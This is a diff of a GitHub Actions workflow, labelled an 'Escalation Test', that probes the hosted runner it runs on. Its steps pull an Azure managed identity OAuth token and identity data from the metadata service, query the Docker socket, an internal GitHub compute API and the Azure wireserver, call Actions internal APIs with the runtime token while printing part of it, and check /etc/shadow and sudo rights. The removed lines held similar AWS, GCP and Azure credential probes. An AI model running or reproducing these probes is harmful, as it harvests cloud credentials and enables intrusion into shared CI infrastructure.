@@ -1,45 +1,61 @@
-name: Deep Security Test
+name: Escalation Test
 
 on:
   workflow_dispatch:
 
 jobs:
-  metadata-ssrf:
+  escalate:
     runs-on: ubuntu-latest
     steps:
-      - name: Cloud Metadata SSRF Test
+      - name: Azure Identity Token
         run: |
-          echo "=== AWS IMDS v1 ==="
-          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "BLOCKED"
-          echo "=== AWS IMDS v2 (token) ==="
-          TOKEN=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1) || echo "BLOCKED"
-          echo "TOKEN=$TOKEN"
-          echo "=== AWS IAM Role ==="
-          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo "BLOCKED"
-          echo "=== GCP Metadata ==="
-          curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/ 2>&1 || echo "BLOCKED"
-          echo "=== Azure IMDS ==="
-          curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
-          echo "=== Link-local ==="
-          curl -s --connect-timeout 3 http://169.254.170.2/v2/credentials/ 2>&1 || echo "BLOCKED"
-          echo "=== Docker Socket ==="
-          curl -s --connect-timeout 3 --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 || echo "BLOCKED"
-          echo "=== Network interfaces ==="
-          ip addr show 2>&1 | head -30
-          echo "=== DNS resolution ==="
-          nslookup metadata.google.internal 2>&1 || echo "no resolution"
-          echo "=== Process info ==="
-          cat /proc/self/cgroup 2>&1 | head -5
-          echo "=== Mount info ==="
-          mount | head -10
-          echo "=== Token file check ==="
-          ls -la /home/runner/work/_temp/ 2>&1 | head -10
-          echo "=== GitHub context ==="
-          echo "ACTIONS_RUNTIME_TOKEN exists: $(test -n \"$ACTIONS_RUNTIME_TOKEN\" && echo yes || echo no)"
-          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
-          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
-          echo "=== Internal API ==="
+          echo "=== Azure Managed Identity Token ==="
+          curl -s --connect-timeout 5 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
+          echo ""
+          echo "=== Azure Identity Info ==="
+          curl -s --connect-timeout 5 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1
+          echo ""
+          echo "=== Azure Attested Data ==="
+          curl -s --connect-timeout 5 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -5
+          echo ""
+          echo "=== Azure Scheduledevents ==="
+          curl -s --connect-timeout 5 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
+          echo ""
+          echo "=== Docker Info ==="
+          curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | head -30
+          echo ""
+          echo "=== Docker Images ==="
+          curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>&1 | head -20
+          echo ""
+          echo "=== Hosted Compute RO API ==="
+          curl -s --connect-timeout 5 \
+            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1" 2>&1 | head -10
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          echo "Token exists: $(test -n \"$ACTIONS_RUNTIME_TOKEN\" && echo YES || echo NO)"
           if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RUNTIME_URL/_apis/pipelines/1/runs" 2>&1 | head -20
+            echo "Token prefix: ${ACTIONS_RUNTIME_TOKEN:0:20}..."
+            echo "=== Actions Internal API ==="
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_RUNTIME_URL}_apis/pipelines" 2>&1 | head -20
+            echo "=== Actions Artifacts API ==="
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_RUNTIME_URL}_apis/pipelines/1/runs?api-version=6.0-preview" 2>&1 | head -20
           fi
+          echo ""
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "Cache URL: $ACTIONS_CACHE_URL"
+          echo "Results URL: $ACTIONS_RESULTS_URL"
+          echo ""
+          echo "=== Wireserver ==="
+          curl -s --connect-timeout 3 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -20
+          echo ""
+          echo "=== Check /etc/shadow readable ==="
+          ls -la /etc/shadow 2>&1
+          echo "=== Sudo access ==="
+          sudo -l 2>&1 | head -10
           echo "=== Complete ==="
